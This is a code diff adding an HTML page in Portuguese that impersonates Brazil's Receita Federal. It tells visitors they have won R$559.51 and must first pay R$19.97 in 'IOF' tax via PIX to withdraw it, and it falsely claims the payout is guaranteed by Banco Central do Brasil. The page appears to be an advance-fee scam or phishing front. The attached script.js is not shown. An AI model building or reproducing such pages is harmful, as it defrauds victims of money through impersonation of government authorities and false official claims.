@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iof</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="loading-screen">
+        <div class="progress-container">
+            <p id="loading-text">Validando pesquisa</p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="result-screen" class="hidden">
+                    <div class="header">
+                <img src="img/logo-re.png" alt="Receita Federal" class="logo">
+                
+            </div>
+        <div class="result-container">
+
+                        <div class="alert">
+                <p><strong>Imposto (IOF) obrigatório</strong></p>
+
+            </div>
+            <h1 class="title">Imposto sobre Operações Financeiras (IOF)</h1>
+
+            <p style="color:#535862;">O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo <span style="color: black;">Banco Central do Brasil (Lei nº 8.894/94)</span> </p>
+            <p><span style="color: red;">*</span> É necessário realizar o pagamento do IOF para receber o valor acumulado.</p>
+            <div class="summary">
+                <p><strong>Resumo</strong></p>
+                <div class="separator"></div>
+                <p>Valor ganho: <span>R$559.51</span></p>
+                <div class="separator"></div>
+                <p>Valor a ser pago (IOF): <span style="color: #DE4E33;">- R$19.97</span></p>
+                <p style="color: #DE4E33;">Imposto sobre Operações Financeiras</p>
+                <div class="separator"></div>
+                <p>Total a receber: <span>R$539.54</span></p>
+                <p style="color: #535862;">O pagamento de R$559.51 será processado via PIX de forma imediata.</p>
+            </div>
+            <div class="guarantee">
+                <p><strong>Garantia de recebimento</strong></p>
+                <p>O valor ganho de R$559.51 é garantido pelo Banco Central do Brasil</p>
+            </div>
+            <div class="payment-method">
+                <h2>Método de pagamento</h2>
+                <div class="separator"></div>
+                <img src="img/pix-logo.webp" alt="PIX logo" class="pix-logo">
+                <p>Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.</p>
+            </div>
+        <div class="agreement">
+            <label for="agreement">
+                <input type="checkbox" id="agreement" />
+                Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.
+            </label>
+            <button id="pay-button" disabled>Pagar Imposto</button>
+        </div>
+            
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
